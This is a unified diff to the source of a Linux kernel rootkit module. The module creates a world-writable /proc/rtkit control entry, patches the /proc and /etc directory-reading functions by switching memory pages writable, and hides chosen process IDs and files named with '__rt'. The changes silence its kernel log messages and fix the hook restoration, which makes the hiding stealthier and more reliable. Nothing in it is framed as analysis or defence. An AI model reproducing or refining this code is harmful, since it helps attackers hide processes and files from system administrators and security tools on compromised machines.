@@ -86,8 +86,8 @@ static void set_addr_ro(void *addr)
 static int proc_filldir_new(struct dir_context *dirent, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
 {
 	int i;
-	printk("fs_filldir_new");
-	dirent->actor=proc_filldir_orig;
+//	printk("fs_filldir_new");
+//	dirent->actor=proc_filldir_orig;
 	for (i=0; i < current_pid; i++) {
 		if (!strcmp(name, pids_to_hide[i])) return 0;
 	}
@@ -97,17 +97,20 @@ static int proc_filldir_new(struct dir_context *dirent, const char *name, int na
 
 static int proc_readdir_new(struct file *filp, struct dir_context *dirent)
 {
-	printk("proc_readdir_new");
+	int ret;
+//	printk("proc_readdir_new");
 	proc_filldir_orig = dirent->actor;
 	dirent->actor = proc_filldir_new;
-	return proc_readdir_orig(filp, dirent);
+	ret = proc_readdir_orig(filp, dirent);
+	dirent->actor=proc_filldir_orig;
+	return ret;
 }
 
 //static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
 static int fs_filldir_new(struct dir_context *dirent, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
 {
-	printk("fs_filldir_new");
-	dirent->actor=fs_filldir_orig;
+//	printk("fs_filldir_new");
+//	dirent->actor=fs_filldir_orig;
 	if (hide_files && (!strncmp(name, "__rt", 4) || !strncmp(name, "10-__rt", 7))) return 0;
 	return fs_filldir_orig(dirent, name, namelen, offset, ino, d_type);
 }
@@ -115,10 +118,13 @@ static int fs_filldir_new(struct dir_context *dirent, const char *name, int name
 //static int fs_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
 static int fs_readdir_new(struct file *filp, struct dir_context *dirent)
 {
-	printk("fs_readdir_new");
+	int ret;
+//	printk("fs_readdir_new");
 	fs_filldir_orig = dirent->actor;
 	dirent->actor = fs_filldir_new;
-	return fs_readdir_orig(filp, dirent);
+	ret = fs_readdir_orig(filp, dirent);
+	dirent->actor=fs_filldir_orig;
+	return ret;
 }
 
 //static int rtkit_read(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data)
@@ -223,11 +229,11 @@ static void fs_clean(void)
 static int __init procfs_init(void)
 {
 	struct file *proc_filp;
-	printk("in_rootkit_proc_init");
+//	printk("in_rootkit_proc_init");
 	//new entry in proc root with 666 rights
 	proc_rtkit = proc_create("rtkit", 0666, NULL, &rtkit_fops);
 	if (proc_rtkit == NULL) return 0;
-	printk("rootkit_proc_init_rtkit_success");
+//	printk("rootkit_proc_init_rtkit_success");
 	//proc_root = proc_rtkit->parent;
 	//if (proc_root == NULL || strcmp(proc_root->name, "/proc") != 0) {
 	//	return 0;
@@ -235,7 +241,7 @@ static int __init procfs_init(void)
 
 	proc_filp = filp_open("/proc", O_RDONLY, 0);
 	if (proc_filp == NULL) return 0;
-	printk("rootkit_proc_init_proc_success");
+//	printk("rootkit_proc_init_proc_success");
 	//substitute proc readdir to our wersion (using page mode change)
 	proc_fops = ((struct file_operations *) proc_filp->f_op);
 	filp_close(proc_filp, NULL);
@@ -253,18 +259,18 @@ static int __init procfs_init(void)
 		set_addr_ro(proc_fops);
 	}
 
-	printk("rootkit_proc_init_success");
+//	printk("rootkit_proc_init_success");
 	return 1;
 }
 
 static int __init fs_init(void)
 {
 	struct file *etc_filp;
-	printk("in_rootkit_fs_init");	
+//	printk("in_rootkit_fs_init");	
 	//get file_operations of /etc
 	etc_filp = filp_open("/etc", O_RDONLY, 0);
 	if (etc_filp == NULL) return 0;
-	printk("rootkit_fs_init_etc_success");
+//	printk("rootkit_fs_init_etc_success");
 	fs_fops = (struct file_operations *) etc_filp->f_op;
 	filp_close(etc_filp, NULL);
 	
@@ -282,7 +288,7 @@ static int __init fs_init(void)
 		set_addr_ro(fs_fops);
 	}
 	
-	printk("rootkit_fs_init_success");
+//	printk("rootkit_fs_init_success");
 	return 1;
 }
 
